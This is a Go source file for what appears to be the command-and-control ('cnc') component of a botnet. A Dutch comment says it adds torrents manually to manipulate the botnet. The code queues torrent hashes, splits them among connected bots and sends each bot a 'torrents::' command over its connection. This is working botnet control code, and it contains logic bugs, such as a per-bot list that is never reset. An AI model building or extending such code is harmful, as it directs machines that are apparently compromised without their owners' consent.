package cnc

import (
	"bufio"
	"net/textproto"
)

//Manueel torrents toevoegen om botnet te manipuleren.

//QueueTorrent - Een torrent in de queue
type QueueTorrent struct {
	Hash        string
	botAssigned string
}

//QueueTorrents - Torrents in the queue to send to bots
var QueueTorrents []QueueTorrent
var maxPerBot int

//CheckDoubleTorrent - check if a double is in the torrentslist
func CheckDoubleTorrent(torrentList []QueueTorrent, torrent QueueTorrent) bool {
	for _, botTorrent := range torrentList {
		if botTorrent.botAssigned == torrent.botAssigned && botTorrent.Hash == torrent.Hash {
			return true
		}
	}

	return false
}

//AssignTorrentsToBots - The function that handles queuing of torrents over different bots
func AssignTorrentsToBots() {

	var torrentList []QueueTorrent

	for botIndex, bot := range Bots {
		var doubleTorrent bool

		doubleTorrent = false

		for torrentIndex, torrent := range QueueTorrents {

			torrent.botAssigned = bot.id
			doubleTorrent = CheckDoubleTorrent(torrentList, torrent)

			if !doubleTorrent {
				torrentList = append(torrentList, torrent)
				QueueTorrents[torrentIndex] = torrent
			}

			if len(torrentList) == maxPerBot {
				break
			}

		}

		Bots[botIndex].Torrents = torrentList

	}

}

//SendTorrents - share the torrents over the bots
func SendTorrents() {
	for _, bot := range Bots {
		writer := bufio.NewWriter(bot.Connection)
		tpw := textproto.NewWriter(writer)

		tpw.PrintfLine(BuildTorrentsMessage(&bot))
	}
}

//BuildTorrentsMessage - builds message to send to the bot
func BuildTorrentsMessage(bot *Bot) string {
	torrentHashes := ""

	for _, torrent := range bot.Torrents {
		torrentHashes += torrent.Hash + ","
	}

	return "torrents::" + torrentHashes[:len(torrentHashes)-1]
}

//AddTorrent - een torrent toevoegen aan de queue
func AddTorrent(hash string) {
	torrentItem := QueueTorrent{
		Hash:        hash,
		botAssigned: "",
	}

	QueueTorrents = append(QueueTorrents, torrentItem)
}
